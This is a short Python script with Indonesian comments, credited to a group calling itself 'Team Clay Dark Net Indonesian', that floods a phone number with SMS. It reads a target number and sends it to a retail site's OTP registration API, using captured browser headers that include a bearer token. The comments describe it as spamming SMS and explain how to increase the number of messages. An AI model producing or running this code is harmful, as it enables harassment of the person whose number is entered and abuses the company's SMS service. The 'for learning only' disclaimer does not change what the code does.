#bin/!/python
#script ini no limit jika website blum di uptade
#jika pesan tidak masuk sama sekali kalian tunggu  20 menit
#peringatan
#script ini tidak boleh di jual dan script ini berhak semua orang punya jadi ini
#buat pembelajaran semata dan jangan di salah gunakan
#TEAM CLAY DARK NET INDONESIAN SINCE 2011

#di bawah ini adalah bahan yang di gunakan untuk menjalankan pemograman python
import os,sys,time,requests,json
from os import system
from time import sleep

system("clear") #ini system pembersihan teks pesan di termux



number = input("masukan nomor : ") #ini adalah pemasukan nomor anda bisa mengubah terserah kalian asal jangan ubah yang tidak teks berwarna hijau

# di bawah ini adalah headers website yang di sebut beranda yang dicapture oleh kiwi browser
headers = {
"Origin":"https://www.mapclub.com",
"Accept":"application/json, text/plain, */*",
"Accept-Language":"en-US",
"Authorization":"BearereyJhbGciOiJIUZUxMiJ9.eyJndWVzdENvZGUiOilOZDcwYjk5YS0xODUXLTQ4MjgtODU2Mi02M2FKM2FIN2MONJEILCJleHBpcmVkljoxNjk4NDQxODEzMjI4LCJleHBpcmUiOjM2MDAsImV4cC16MTY5ODQ0MTgxMywiaWF0IjoxNjk4NDM4MjEzLCJwbGF0Zm9ybSl6lldFQiJ9.huHZzYienE_XaNVpBkyzSm3lRxuZofOn2pILrQTjenLR2GrdTdSar62-dV32_6hrlGv2bjk1xuySkoQcLkywQQ",
"Client-Platform":"WEB",
"Client-Timestamp":"1698438210723",
"Content-Length":"25",
"Content-Type":"application/json",
"Referer":"https://www.mapclub.com/",
"Sec-Ch-Ua-Mobile":"?1",
"Sec-Ch-Ua-Platform":"Android",
"Sec-Fetch-Dest":"empty",
"Sec-Fetch-Mode":"cors",
"Sec-Fetch-Site":"same-site",
"User-Agent":"Mozilla/5.0 (Linux, Android 10; K) AppleWebkit/537.36 (KHTML, like Gecko)Chrome/116.0.0.0 Mobile Safari/537.36",
"Accept-Encoding":"gzip,deflate, br",
}

data = json.dumps({"account":number}) #ini data input nomor yang ingin kalian spam sms

for i in range(1): #ini pemasukan pesan yang di ingin jika kamu ubah angka 1 sama 2 maka akan masuk pesan 2x
    post = requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp?channel-SMS",headers=headers,data=data) #ini gabungan headers sama data yang akan di proses oleh perintah termux
    print (post) #ini adalah respon atau yang disebut pemasukan pesan di website nya
